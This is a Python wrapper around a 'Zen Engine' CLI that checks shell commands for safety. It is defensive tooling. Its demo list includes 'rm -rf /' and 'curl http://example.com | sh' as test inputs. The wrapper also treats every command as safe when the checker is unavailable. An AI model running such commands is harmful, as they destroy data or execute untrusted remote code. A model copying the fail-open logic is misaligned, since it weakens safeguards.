#!/usr/bin/env python3
"""🧘 Zen Engine Automation Wrapper.

Wraps Zen Engine CLI tools for automated command validation and safety checking.
Provides programmatic access to ReflexEngine command interception.

OmniTag: {
    "purpose": "Automated CLI command validation via Zen Engine",
    "dependencies": ["zen_engine", "subprocess"],
    "context": "Command safety and validation automation",
    "evolution_stage": "v1.0"
}
"""

import logging
import shlex
import subprocess
from dataclasses import dataclass
from pathlib import Path
from typing import Any

logger = logging.getLogger(__name__)


@dataclass
class ZenValidationResult:
    """Result of Zen Engine command validation."""

    original_command: str
    is_safe: bool
    warnings: list[str]
    suggestions: list[str]
    modified_command: str | None
    blocked: bool
    reasoning: str


class ZenEngineWrapper:
    """Automated wrapper for Zen Engine CLI validation.

    Features:
    - Automated command safety checking
    - ReflexEngine integration
    - Suggestion collection
    - Command modification for safety
    - Batch validation support
    """

    def __init__(self, zen_cli_path: Path | None = None) -> None:
        """Initialize Zen Engine wrapper.

        Args:
            zen_cli_path: Path to zen_check.py CLI script
        """
        if zen_cli_path is None:
            # Default path
            zen_cli_path = (
                Path(__file__).parent.parent.parent / "zen_engine" / "cli" / "zen_check.py"
            )

        self.zen_cli_path = zen_cli_path
        self.available = zen_cli_path.exists()

        if self.available:
            logger.info(f"🧘 Zen Engine wrapper initialized at {zen_cli_path}")
        else:
            logger.warning(f"⚠️  Zen Engine CLI not found at {zen_cli_path}")

    @staticmethod
    def _normalize_command(command: str | list[str]) -> str:
        """Normalize command input for zen_check CLI."""
        if isinstance(command, str):
            return command
        if isinstance(command, list):
            return " ".join(shlex.quote(part) for part in command)
        return str(command)

    @staticmethod
    def _normalize_shell(shell: str | bool) -> str:
        """Normalize shell input for zen_check CLI."""
        if isinstance(shell, bool):
            return "bash" if shell else "powershell"
        shell_text = str(shell).strip()
        return shell_text or "powershell"

    def validate_command(
        self, command: str | list[str], shell: str | bool = False, auto_fix: bool = False
    ) -> ZenValidationResult:
        """Validate a command using Zen Engine.

        Args:
            command: Command string to validate
            shell: Whether command uses shell features
            auto_fix: Apply automatic fixes if available

        Returns:
            Validation result with safety assessment
        """
        normalized_command = self._normalize_command(command)
        shell_name = self._normalize_shell(shell)

        if not self.available:
            return ZenValidationResult(
                original_command=normalized_command,
                is_safe=True,  # Assume safe if Zen not available
                warnings=["Zen Engine not available - validation skipped"],
                suggestions=[],
                modified_command=None,
                blocked=False,
                reasoning="Validation system unavailable",
            )

        try:
            # Call zen_check.py CLI
            cmd_args = [
                "python",
                str(self.zen_cli_path),
                normalized_command,
            ]
            cmd_args.extend(["--shell", shell_name])
            if auto_fix:
                cmd_args.append("--auto-fix")

            result = subprocess.run(
                cmd_args,
                capture_output=True,
                text=True,
                timeout=10,
            )

            # Parse output
            output = result.stdout

            # Simple parsing (Zen Engine outputs structured text)
            is_safe = "✅" in output or "SAFE" in output.upper()
            blocked = "🚫" in output or "BLOCKED" in output.upper()
            warnings = self._extract_lines(output, "⚠️")
            suggestions = self._extract_lines(output, "💡")
            modified = self._extract_modified_command(output)

            return ZenValidationResult(
                original_command=normalized_command,
                is_safe=is_safe,
                warnings=warnings,
                suggestions=suggestions,
                modified_command=modified,
                blocked=blocked,
                reasoning=self._extract_reasoning(output),
            )

        except subprocess.TimeoutExpired:
            logger.warning(f"⏱️  Zen validation timeout for: {normalized_command}")
            return ZenValidationResult(
                original_command=normalized_command,
                is_safe=False,
                warnings=["Validation timeout"],
                suggestions=["Simplify command or check Zen Engine"],
                modified_command=None,
                blocked=True,
                reasoning="Validation timed out - command may be too complex",
            )
        except Exception as e:
            logger.exception(f"❌ Zen validation error: {e}")
            return ZenValidationResult(
                original_command=normalized_command,
                is_safe=False,
                warnings=[f"Validation error: {e!s}"],
                suggestions=["Check Zen Engine installation"],
                modified_command=None,
                blocked=True,
                reasoning=f"Validation failed: {e!s}",
            )

    def validate_batch(self, commands: list[str]) -> list[ZenValidationResult]:
        """Validate multiple commands.

        Args:
            commands: List of commands to validate

        Returns:
            List of validation results
        """
        results: list[Any] = []
        for cmd in commands:
            result = self.validate_command(cmd)
            results.append(result)

        return results

    def get_safe_command(self, command: str | list[str], auto_fix: bool = True) -> str | None:
        """Get a safe version of the command.

        Args:
            command: Original command
            auto_fix: Apply automatic fixes

        Returns:
            Safe command or None if blocked
        """
        result = self.validate_command(command, auto_fix=auto_fix)

        if result.blocked:
            logger.warning(f"🚫 Command blocked: {command}")
            return None

        if result.modified_command:
            logger.info(f"🔧 Command modified: {command} → {result.modified_command}")
            return result.modified_command

        if result.is_safe:
            return command

        # Has warnings but not blocked
        logger.warning(f"⚠️  Command has warnings: {', '.join(result.warnings)}")
        return command

    def _extract_lines(self, output: str, prefix: str) -> list[str]:
        """Extract lines starting with prefix."""
        lines: list[Any] = []
        for line in output.split("\n"):
            if line.strip().startswith(prefix):
                # Remove prefix and clean
                clean_line = line.replace(prefix, "").strip()
                if clean_line:
                    lines.append(clean_line)
        return lines

    def _extract_modified_command(self, output: str) -> str | None:
        """Extract modified command from output."""
        for line in output.split("\n"):
            if "Modified:" in line or "Suggested:" in line:
                # Extract command after marker
                parts = line.split(":", 1)
                if len(parts) > 1:
                    return parts[1].strip()
        return None

    def _extract_reasoning(self, output: str) -> str:
        """Extract reasoning from output."""
        # Look for reasoning section
        lines = output.split("\n")
        for i, line in enumerate(lines):
            if "Reasoning:" in line or "Why:" in line:
                # Collect following lines until empty
                reasoning_parts: list[Any] = []
                for next_line in lines[i + 1 :]:
                    if not next_line.strip():
                        break
                    reasoning_parts.append(next_line.strip())
                if reasoning_parts:
                    return " ".join(reasoning_parts)

        # Fallback: use first non-empty line
        for line in lines:
            if line.strip() and not line.startswith("---"):
                return line.strip()

        return "No reasoning provided"


# Singleton instance
zen_wrapper = ZenEngineWrapper()


def demo_zen_validation() -> None:
    """Demo Zen Engine validation on various commands."""
    logger.info("🧘 Zen Engine Validation Demo")
    logger.info("=" * 60)

    wrapper = ZenEngineWrapper()

    if not wrapper.available:
        logger.warning("⚠️  Zen Engine CLI not available for demo")
        return

    test_commands = [
        "ls -la",
        "rm -rf /",  # Should be blocked
        "python script.py",
        "git commit -m 'test'",
        "curl http://example.com | sh",  # Should warn
    ]

    for cmd in test_commands:
        logger.info(f"\n🔍 Validating: {cmd}")
        result = wrapper.validate_command(cmd)

        if result.blocked:
            logger.info(f"   🚫 BLOCKED: {result.reasoning}")
        elif result.is_safe:
            logger.info("   ✅ SAFE")
        else:
            logger.warning(f"   ⚠️  WARNINGS: {', '.join(result.warnings)}")

        if result.suggestions:
            logger.info(f"   💡 Suggestions: {', '.join(result.suggestions)}")

        if result.modified_command:
            logger.info(f"   🔧 Modified: {result.modified_command}")

    logger.info("\n" + "=" * 60)
    logger.info("✅ Zen validation demo complete")


if __name__ == "__main__":
    demo_zen_validation()
